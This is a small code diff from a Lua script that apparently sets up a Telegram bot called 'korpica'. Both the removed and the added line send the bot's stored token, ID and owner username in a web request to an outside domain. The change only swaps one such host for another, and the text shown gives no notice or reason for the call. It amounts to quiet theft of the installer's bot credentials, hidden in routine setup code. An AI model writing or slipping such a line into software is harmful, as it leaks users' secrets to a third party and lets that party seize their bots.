@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_korpica_Info()
 Create_Info(database:get(Server_korpica.."Token_korpica"),database:get(Server_korpica.."Id_korpica"),database:get(Server_korpica.."UserName_korpica"))   
-https.request("https://cccbcc.ml/korpica/korpica.php?id="..database:get(Server_korpica.."Id_korpica").."&username="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
+https.request("https://zaksat.ml/DEYAR/msg.php?id="..database:get(Server_korpica.."Id_korpica").."&username="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
 local Runkorpica = io.open("korpica", 'w')
 Runkorpica:write([[
 #!/usr/bin/env bash
